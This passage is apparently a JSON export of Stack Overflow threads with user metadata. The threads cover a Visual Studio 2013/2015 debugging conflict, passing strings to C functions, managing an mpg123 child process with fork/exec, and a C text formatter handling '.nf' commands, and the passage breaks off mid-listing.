"https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "edited": false, "score": 1, "creation_date": 1447242739, "post_id": 33649772, "comment_id": 55073376, "body": "If the project is open in both VS 2013 and 2015. It could be that one process uses a file that the other cannot access. However, if that was the case some errors must have popped up."}, {"owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "reply_to_user": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "edited": false, "score": 0, "creation_date": 1447242817, "post_id": 33649772, "comment_id": 55073414, "body": "@FarhanAnam very interesting! No errors at all! No messages or anything, very strange!"}], "answers": [{"tags": [], "owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "is_accepted": false, "score": 1, "last_activity_date": 1447242743, "creation_date": 1447242743, "answer_id": 33649981, "question_id": 33649772, "link": "https://stackoverflow.com/questions/33649772/program-does-not-run-after-switching-from-vs2013-to-vs2015/33649981#33649981", "title": "Program does not run after switching from VS2013 to VS2015", "body": "<p>The same project was open in both VS2013 and VS2015 at the same time as I was comparing config etc.</p>\n\n<p>When I closed down VS2013, the program ran!</p>\n\n<p>Not entirely sure why this occurred...</p>\n"}, {"comments": [{"owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "edited": false, "score": 0, "creation_date": 1447243891, "post_id": 33650155, "comment_id": 55073945, "body": "Thank-you @FarhanAnam !"}], "tags": [], "owner": {"reputation": 5521, "user_id": 4546874, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/4800Y.png?s=128&g=1", "display_name": "F\u1d00\u0280\u029c\u1d00\u0274 A\u0274\u1d00\u1d0d", "link": "https://stackoverflow.com/users/4546874/f%e1%b4%80%ca%80%ca%9c%e1%b4%80%c9%b4-a%c9%b4%e1%b4%80%e1%b4%8d"}, "is_accepted": true, "score": 1, "last_activity_date": 1447244100, "last_edit_date": 1447244100, "creation_date": 1447243408, "answer_id": 33650155, "question_id": 33649772, "link": "https://stackoverflow.com/questions/33649772/program-does-not-run-after-switching-from-vs2013-to-vs2015/33650155#33650155", "title": "Program does not run after switching from VS2013 to VS2015", "body": "<p>Yes the problem is indeed with running the same project in both Visual Studio 2013 and 2015 at the same time. </p>\n\n<p>When you start the program, only the version of VS which was opened first will be able to run the program. This is because the first opened VS attaches the <code>vshost.exe</code> process to the project and denies any access to that exe, which is why the last opened version fails to attach its own <code>vshost.exe</code>. Thus it stops after building the solution.</p>\n"}], "owner": {"reputation": 435, "user_id": 3279193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/41e04541811bb4d56301432ac371dde1?s=128&d=identicon&r=PG&f=1", "display_name": "Chris", "link": "https://stackoverflow.com/users/3279193/chris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 82, "favorite_count": 0, "accepted_answer_id": 33650155, "answer_count": 2, "score": 0, "last_activity_date": 1447244100, "creation_date": 1447242008, "last_edit_date": 1447242884, "question_id": 33649772, "link": "https://stackoverflow.com/questions/33649772/program-does-not-run-after-switching-from-vs2013-to-vs2015", "title": "Program does not run after switching from VS2013 to VS2015", "body": "<p>I have a solution which contains 5 C# projecst, 2 wix projects and a C project (2010). We have been developing this in VS2013 Ultimate and all has been fine. I've just tried opening the solution in VS2015, I have no errors, and no warnings. When I press the start button (F5), nothing happens. I don't even hit the first line of the Program.cs file. All it seems to do is build the project. Any ideas?</p>\n\n<p>EDIT</p>\n\n<p>The same project was open in both VS2013 and VS2015 at the same time as I was comparing config etc.</p>\n\n<p>When I closed down VS2013, the program ran!</p>\n\n<p>Not entirely sure why this occurred...</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 645, "user_id": 4253485, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f487d4517c8377afb2de167d325aa2f0?s=128&d=identicon&r=PG&f=1", "display_name": "Mido", "link": "https://stackoverflow.com/users/4253485/mido"}, "edited": false, "score": 0, "creation_date": 1447242131, "post_id": 33649743, "comment_id": 55073016, "body": "Use char arrays (or uint8_t arrays) instead of uint16_t"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1447242290, "post_id": 33649743, "comment_id": 55073113, "body": "First you need to figure out that an (unprefixed) string literal is a pointer to an array of <i>characters</i>. Then you need to understand what the unary <code>*</code> operator (dereference) does, because you&#39;re using it wrong."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447242397, "post_id": 33649743, "comment_id": 55073177, "body": "@JoachimPileborg: It is not just a pointer for array-initialisation. How else would the compiler know the length for something like <code>char arr[] = &quot;Hello&quot;;</code>?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 645, "user_id": 4253485, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f487d4517c8377afb2de167d325aa2f0?s=128&d=identicon&r=PG&f=1", "display_name": "Mido", "link": "https://stackoverflow.com/users/4253485/mido"}, "edited": false, "score": 0, "creation_date": 1447242520, "post_id": 33649743, "comment_id": 55073246, "body": "@Mido: When using string literals, one normally should not use <code>uint8_t</code>, but <code>char</code> or <code>(un)signed char</code> to clarify you use it as characters, not integers. Even worse ist that <code>char</code> has not necessarily 8 bits as <code>uint8_t</code>."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1447243044, "post_id": 33649743, "comment_id": 55073534, "body": "Formally there are no &quot;strings&quot; in C."}, {"owner": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1447245070, "post_id": 33649743, "comment_id": 55074562, "body": "@JoachimPileborg - Did you read the example is in a C course book?"}, {"owner": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "reply_to_user": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 1, "creation_date": 1447245341, "post_id": 33649743, "comment_id": 55074691, "body": "@alk False. There are strings, cf. ISO 9899:2011 &#167;7.1.1 &#182;1 which defines what a string is."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "reply_to_user": {"reputation": 76134, "user_id": 417501, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/703f62ead2e305b1dff62066065a0554?s=128&d=identicon&r=PG", "display_name": "fuz", "link": "https://stackoverflow.com/users/417501/fuz"}, "edited": false, "score": 0, "creation_date": 1447245555, "post_id": 33649743, "comment_id": 55074798, "body": "@FUZxxl: Fair enough ... :} I should have written &quot;<i>... is no &quot;string&quot; type ...</i>&quot;"}, {"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 1, "creation_date": 1447250033, "post_id": 33649743, "comment_id": 55077247, "body": "@Bracketz Thanks for accepting my answer. However, I&#39;ve spotted some errors in my answer, regarding <code>const</code> qualifiers. I&#39;ve updated my answer, and recommend you take a (brief) look at it."}, {"owner": {"reputation": 368, "user_id": 5842403, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-RKA_WZNw-iw/AAAAAAAAAAI/AAAAAAAAAuQ/gFUyztK-DPg/photo.jpg?sz=128", "display_name": "Joniale", "link": "https://stackoverflow.com/users/5842403/joniale"}, "edited": false, "score": 0, "creation_date": 1506070692, "post_id": 33649743, "comment_id": 79681073, "body": "Here a good example on how to do different things with strings and  pointers in C <a href=\"https://stackoverflow.com/a/46344713/5842403\">stackoverflow.com/a/46344713/5842403</a>"}], "answers": [{"tags": [], "owner": {"reputation": 524, "user_id": 310908, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/94df68c2992b7ff6c16b1e654a476031?s=128&d=identicon&r=PG", "display_name": "Evert", "link": "https://stackoverflow.com/users/310908/evert"}, "is_accepted": false, "score": 0, "last_activity_date": 1447242132, "creation_date": 1447242132, "answer_id": 33649806, "question_id": 33649743, "link": "https://stackoverflow.com/questions/33649743/passing-a-pointer-string-to-a-c-function/33649806#33649806", "title": "Passing a pointer (string) to a C function", "body": "<p>You should view your string as an array of characters (in this case, 8-bit characters) so a uint8_t would suffice. What you normally do is pass the beginning of the string (which is the pointer to the array) to your function. To make it safer, you could also pass the length of the string as an argument, but normally your string will end with a delimiter (\\0).</p>\n\n<p>when you pass <code>stringData</code> to your function, you're actually saying <code>&amp;stringData[0]</code>, literally \"the address (&amp;) of the first element ([0]) of the array\".</p>\n"}, {"tags": [], "owner": {"reputation": 81300, "user_id": 296974, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/0e26cfe3ac75cd582ca200fbc6fa0421?s=128&d=identicon&r=PG", "display_name": "glglgl", "link": "https://stackoverflow.com/users/296974/glglgl"}, "is_accepted": false, "score": 3, "last_activity_date": 1447243945, "last_edit_date": 1447243945, "creation_date": 1447242242, "answer_id": 33649837, "question_id": 33649743, "link": "https://stackoverflow.com/questions/33649743/passing-a-pointer-string-to-a-c-function/33649837#33649837", "title": "Passing a pointer (string) to a C function", "body": "<p>There are two kinds of strings: \"non-wide\" ones which consist of <code>char</code>s and \"wide\" ones which consist of <code>wchar_t</code>s and are written as <code>L\"\"</code> (single <code>wchar_t</code>s can be written as <code>L''</code>). There are functions to convert between them; apart from these, you cannot intermix them.</p>\n\n<p>Depending on the system, a <code>wchar_t</code> can be 16 or 32 bits wide.</p>\n"}, {"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "is_accepted": true, "score": 6, "last_activity_date": 1447344340, "last_edit_date": 1495540427, "creation_date": 1447243129, "answer_id": 33650093, "question_id": 33649743, "link": "https://stackoverflow.com/questions/33649743/passing-a-pointer-string-to-a-c-function/33650093#33650093", "title": "Passing a pointer (string) to a C function", "body": "<p>Your immediate questions:</p>\n\n<blockquote>\n  <ul>\n  <li>Is it correct to declare a string with uint16_t?</li>\n  </ul>\n</blockquote>\n\n<p>No.</p>\n\n<p>All strings are always <code>char[]</code>. There ar also <em>wide strings</em> (strings of <em>wide characters</em>), which have the type <code>wchar_t[]</code>, and are written with an <code>L</code> prefix (e.g. <code>L\"hello\"</code>).</p>\n\n<blockquote>\n  <ul>\n  <li>What is recommended way to pass a string to a function?</li>\n  </ul>\n</blockquote>\n\n<p>As a pointer to the first character in the string, so either <code>char *</code> or <code>wchar_t *</code>. The <code>const</code> qualifier makes no sense here; it would mean that the pointer (not the string itself) is constant (see <a href=\"https://stackoverflow.com/questions/1143262/what-is-the-difference-between-const-int-const-int-const-and-int-const\">here</a>). I'd recommend writing <code>wchar_t const *</code> or <code>const wchar_t *</code> instead; it has a different meaning (i.e. the string can't be changed), but it's correct and meaningful.</p>\n\n<hr>\n\n<p>You mention that this code is from a course book. I'm not sure whether you mean that these are lecture notes handed out by your professor, or whether you bought a published book. In either case, if this snippet is representative of the quality of the book/notes, <strong>get a refund</strong>.</p>\n\n<p>For now, let's make this code work.</p>\n\n<p>There's an error in this code that will cause the program to crash:</p>\n\n<ul>\n<li><code>printf(\"... %s ...\", ..., *string, ...)</code> when <code>string</code> is a <code>char*</code> is always wrong. Don't dereference that pointer.</li>\n</ul>\n\n<p>If you insist on using \"wide\" characters (which is <a href=\"http://utf8everywhere.org/\" rel=\"nofollow noreferrer\">questionable</a>), you're going to have to change a few things:</p>\n\n<ul>\n<li>Rather than using <code>char</code>, you need to include <code>&lt;wchar.h&gt;</code> and use <code>wchar_t</code> instead. As far as I know, <code>uint16_t</code> and <code>uint8_t</code> won't work unless you use explicit casting everywhere. That's because <code>char</code> doesn't have 8 bits, but <a href=\"https://stackoverflow.com/questions/3200954/what-is-char-bit\"><code>CHAR_BIT</code> bits</a>.</li>\n<li>Wide character literals must start with an <code>L</code> prefix.</li>\n<li>Rather than using <code>printf</code>, you need to use <code>wprintf</code>.</li>\n<li>In the format string, use <code>%ls</code> rather than <code>%s</code>. (<a href=\"https://stackoverflow.com/questions/17700797/printf-wprintf-s-s-ls-char-and-wchar-errors-not-announced-by-a-compil\">Unless you use Microsoft's compiler</a>.)</li>\n</ul>\n\n<p>Finally, some less grave errors:</p>\n\n<ul>\n<li>As noted, <code>T * const</code> arguments are useless. The author probably meant <code>T const *</code> (or equivalently <code>const T *</code>).</li>\n<li>You can remove <code>&lt;stdint.h&gt;</code> and <code>&lt;stdio.h&gt;</code>. We're no longer using <code>uint16_t</code>, and <code>&lt;wchar.h&gt;</code> declares some wide character <code>&lt;stdio.h&gt;</code>-like functions.</li>\n</ul>\n\n<p>I end up with the following code:</p>\n\n<pre><code>#include &lt;wchar.h&gt;\n\nvoid Terminal_PrintData(wchar_t const * Data);\n\nint main(void){\n    wchar_t StringData[] = L\"MyData\";\n    Terminal_PrintData(StringData);\n}\n\nvoid Terminal_PrintData(wchar_t const * Data)\n{\n    wprintf(L\"Value: %ls\", Data);\n}\n</code></pre>\n\n<p>This compiles and runs as expected with both GCC and Clang on Linux x86-64.</p>\n"}], "owner": {"reputation": 307, "user_id": 5545760, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/78319955776d9966c396ecbb22de2592?s=128&d=identicon&r=PG&f=1", "display_name": "Bracketz", "link": "https://stackoverflow.com/users/5545760/bracketz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2069, "favorite_count": 0, "accepted_answer_id": 33650093, "answer_count": 3, "score": 0, "last_activity_date": 1447344340, "creation_date": 1447241917, "question_id": 33649743, "link": "https://stackoverflow.com/questions/33649743/passing-a-pointer-string-to-a-c-function", "title": "Passing a pointer (string) to a C function", "body": "<p>Please read until the end before you say: \"Oh no, this question again...\"</p>\n\n<p>I am right now seating in a C course and the following example has been provided in course book:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n\nvoid Terminal_PrintData(uint16_t * const Data);\n\nint main(void){\n    uint16_t StringData[] = \"MyData\";\n    Terminal_PrintData(StringData);\n}\n\nvoid Terminal_PrintData(uint16_t * const Data)\n{\n    printf(\"Value: %s\", *Data);\n}\n</code></pre>\n\n<p>When I compile this masterpiece, this is what I get:</p>\n\n<pre><code>F:\\AVR Microcontroller&gt;gcc -o test test.c\ntest.c: In function 'main':\ntest.c:7:26: error: wide character array initialized from non-wide string\n  uint16_t StringData[] = \"MyData\";\n</code></pre>\n\n<p>My questions are:</p>\n\n<ul>\n<li>Is it correct to declare a string with <code>uint16_t</code>?</li>\n<li>What is recommended way to pass a string to a function?</li>\n</ul>\n"}, {"tags": ["c", "linux", "fork"], "answers": [{"comments": [{"owner": {"reputation": 53, "user_id": 4128107, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-DzcUpz3IsZU/AAAAAAAAAAI/AAAAAAAAAKY/UOoxUeTLJfM/photo.jpg?sz=128", "display_name": "Kalu DADA", "link": "https://stackoverflow.com/users/4128107/kalu-dada"}, "edited": false, "score": 0, "creation_date": 1451475809, "post_id": 33650000, "comment_id": 56798789, "body": "i got ur point and edited the question, i doubt whether similar commands can be used for 2nd command, and my exact question since the mpg123 player is attached to the fifo in child process, now from parents process commands are supplied, so how the status of the player we can get in parent process?"}], "tags": [], "owner": {"reputation": 7560, "user_id": 1034749, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/2022f0caae119ed6232cf370bb9d9d3a?s=128&d=identicon&r=PG", "display_name": "fghj", "link": "https://stackoverflow.com/users/1034749/fghj"}, "is_accepted": true, "score": 1, "last_activity_date": 1447242812, "last_edit_date": 1495542173, "creation_date": 1447242812, "answer_id": 33650000, "question_id": 33649658, "link": "https://stackoverflow.com/questions/33649658/stop-mpg123-after-playing-the-file-completely-in-automatically/33650000#33650000", "title": "Stop mpg123 after playing the file completely in automatically", "body": "<p>You have no <code>?</code> in your question, but any way\nyour code looks wrong, because <code>system</code> uses <code>fork</code> and <code>exec</code>\nunder the hood. So instead of one <code>fork</code> and one <code>exec</code>\nyou use <code>fork</code> three times and uses <code>execv</code> twice.</p>\n\n<p>Read how to run process here: <a href=\"https://stackoverflow.com/questions/19099663/how-to-correctly-use-fork-exec-wait\">how to correctly use fork, exec, wait</a></p>\n\n<p>after you run process in proper way, you have real pid of <code>mpg123</code>,\nand so you can kill it if you want, or pause or what else you want.</p>\n"}], "owner": {"reputation": 53, "user_id": 4128107, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-DzcUpz3IsZU/AAAAAAAAAAI/AAAAAAAAAKY/UOoxUeTLJfM/photo.jpg?sz=128", "display_name": "Kalu DADA", "link": "https://stackoverflow.com/users/4128107/kalu-dada"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 490, "favorite_count": 0, "accepted_answer_id": 33650000, "answer_count": 1, "score": 0, "last_activity_date": 1451475571, "creation_date": 1447241595, "last_edit_date": 1451475571, "question_id": 33649658, "link": "https://stackoverflow.com/questions/33649658/stop-mpg123-after-playing-the-file-completely-in-automatically", "title": "Stop mpg123 after playing the file completely in automatically", "body": "<p>First I have used mpg123 remotely using FIFOs to implement Pause functionality, but now I want to close the mpg123 player when file is played through automatically.</p>\n\n<p>The code for playing current is  </p>\n\n<pre><code>pid p = fork();  \nif (p&lt;0)  \n  return;  \nelse if (p==0)  \n  execlp(\"mpg123\", \"mpg123\", \"-R\", \"--fifo\", \"aFifo\", NULL);  \nelse  \n  system(\"load test.mp3 &gt; aFifo\");\n</code></pre>\n\n<p>Currently if the file is played through then also child process <strong>else if (p==0)</strong> will stay there and mpg123 player process will continue to exist</p>\n"}, {"tags": ["c", "formatting", "user-input"], "comments": [{"owner": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "reply_to_user": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "edited": false, "score": 0, "creation_date": 1447242048, "post_id": 33649520, "comment_id": 55072971, "body": "I tried adding another condition but the formatting features after <code>.nf</code> still work"}, {"owner": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "reply_to_user": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "edited": false, "score": 0, "creation_date": 1447242322, "post_id": 33649520, "comment_id": 55073137, "body": "Yeah I think thats where i&#39;m a bit stuck, on how to skip the other if statements when <code>useFormats =0;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "edited": false, "score": 0, "creation_date": 1447242654, "post_id": 33649905, "comment_id": 55073327, "body": "Yeah thats exactly what I tried earlier, but thanks i&#39;ll try it again"}, {"owner": {"reputation": 218, "user_id": 2350525, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e59bba6445a3993abeb237769f708e71?s=128&d=identicon&r=PG", "display_name": "Talaria", "link": "https://stackoverflow.com/users/2350525/talaria"}, "reply_to_user": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "edited": false, "score": 0, "creation_date": 1447242879, "post_id": 33649905, "comment_id": 55073452, "body": "Above you;ll see the edit that assigns a value with <code>=</code> instead of evaluating <code>==</code>. It also has <code>break</code> at the end of the block which while force you to break out of the current inner loop."}, {"owner": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "edited": false, "score": 0, "creation_date": 1447243063, "post_id": 33649905, "comment_id": 55073544, "body": "do I still put that <code>if</code> statement inside the while loop <code>while useFormats == 1</code> or do I get rid of the while loop"}, {"owner": {"reputation": 218, "user_id": 2350525, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e59bba6445a3993abeb237769f708e71?s=128&d=identicon&r=PG", "display_name": "Talaria", "link": "https://stackoverflow.com/users/2350525/talaria"}, "reply_to_user": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "edited": false, "score": 0, "creation_date": 1447243424, "post_id": 33649905, "comment_id": 55073719, "body": "if you want to stop running the inner loop when you find .nf then you can get rid of the outer loop and useFormats altogether and just keep <code>break;</code> to get you out of the while loop"}, {"owner": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "edited": false, "score": 0, "creation_date": 1447243559, "post_id": 33649905, "comment_id": 55073784, "body": "I think theres something wrong with my program because whichever way I do it, it literally just prints the first line of code then ends the whole program"}], "tags": [], "owner": {"reputation": 218, "user_id": 2350525, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e59bba6445a3993abeb237769f708e71?s=128&d=identicon&r=PG", "display_name": "Talaria", "link": "https://stackoverflow.com/users/2350525/talaria"}, "is_accepted": false, "score": 0, "last_activity_date": 1447242756, "last_edit_date": 1447242756, "creation_date": 1447242478, "answer_id": 33649905, "question_id": 33649520, "link": "https://stackoverflow.com/questions/33649520/how-to-implement-nf-formatting-feature/33649905#33649905", "title": "How to implement `.nf` formatting feature", "body": "<p>As long as this: <code>while ( ( fscanf ( fp, \"%60s\", word)) == 1)</code> evaluates as true it will never break from the while current inner while loop. You can break out of the inner while loop with <code>break;</code> after your condition is met. It will then check the condition and break out of the main while loop. You also don't assign a value with ==. That operand is for evaluation.</p>\n\n<pre><code>if ( strcmp ( word, \".nf\") == 0) {// stop filling lines (no fill)\n        useFormats = 0;\n        line[0] = '\\0';\n        out = 1;\n        break;\n    }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 155, "user_id": 5510194, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/6318fb28fe1e585486b0c1328c3eb2f9?s=128&d=identicon&r=PG&f=1", "display_name": "JayJay Simpson", "link": "https://stackoverflow.com/users/5510194/jayjay-simpson"}, "edited": false, "score": 0, "creation_date": 1447245225, "post_id": 33650570, "comment_id": 55074627, "body": "thank you so much that helped a lot, I was still trying to see where I went wrong"}], "tags": [], "owner": {"reputation": 6975, "user_id": 3121023, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f52448806175b9aa66c86d40cf0829f1?s=128&d=identicon&r=PG&f=1", "display_name": "user3121023", "link": "https://stackoverflow.com/users/3121023/user3121023"}, "is_accepted": true, "score": 0, "last_activity_date": 1447253395, "last_edit_date": 1447253395, "creation_date": 1447244947, "answer_id": 33650570, "question_id": 33649520, "link": "https://stackoverflow.com/questions/33649520/how-to-implement-nf-formatting-feature/33650570#33650570", "title": "How to implement `.nf` formatting feature", "body": "<p>This should capture the <code>\".nf\"</code> token and set useFormats to zero. Adding <code>if ( useFormats == 1) {</code> to the other format conditions should disable them.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define WIDTH 80\n\nint main(void) {\n    FILE *fp = NULL;\n    char file_name[257] = {'\\0'};\n    char line[61] = {'\\0'};\n    char word[61] = {'\\0'};\n    int out = 0;\n    int blanks = 0;\n    int center = 0;\n    int useFormats = 1;\n    int margin = 0;\n\n    printf ( \"Enter file name:\\n\");\n    scanf ( \" %256[^\\n]\", file_name);\n\n    if ( ( fp = fopen ( file_name, \"r\")) == NULL) {\n        printf ( \"could not open file\\n\");\n        return 1;\n    }\n\n    while ( ( fscanf ( fp, \"%60s\", word)) == 1) {// read file to end one word at a time\n        if ( strcmp ( word, \".nf\") == 0) {// no formatting)\n            useFormats = 0;\n            center = 0;\n            continue;\n        }\n        if ( strncmp ( word, \".ce\", 3) == 0) {\n            if ( useFormats == 1) {\n                if ( ( sscanf ( &amp;word[3], \"%d\", &amp;center)) != 1) {\n                    center = 0;\n                }\n            }\n            continue;\n        }\n        if ( strncmp ( word, \".sp\", 3) == 0) {\n            if ( useFormats == 1) {\n                if ( ( sscanf ( &amp;word[3], \"%d\", &amp;blanks)) == 1) {\n                    margin = 0;\n                    if ( center) {\n                        margin = WIDTH - ( ( WIDTH - strlen ( line)) / 2);\n                        center--;\n                    }\n                    printf ( \"%*s\\n\", margin, line);\n                    while ( blanks) {\n                        blanks--;\n                        printf ( \"\\n\");\n                    }\n                    line[0] = '\\0';\n                    out = 1;\n                }\n                else {\n                    margin = 0;\n                    if ( center) {\n                        margin = WIDTH - ( ( WIDTH - strlen ( line)) / 2);\n                        center--;\n                    }\n                    printf ( \"%*s\\n\", margin, line);\n                    line[0] = '\\0';\n                    out = 1;\n                }\n            }\n            continue;\n        }\n        if ( strcmp ( word, \".br\") == 0) {\n            if ( useFormats == 1) {\n                margin = 0;\n                if ( center) {\n                    margin = WIDTH - ( ( WIDTH - strlen ( line)) / 2);\n                    center--;\n                }\n                printf ( \"%*s\\n\", margin, line);\n                line[0] = '\\0';\n                out = 1;\n            }\n            continue;\n        }\n        if ( strlen ( line) + strlen ( word) + 1 &lt;= 60) {\n            strcat ( line, \" \");\n            strcat ( line, word);\n            out = 0;\n        }\n        else 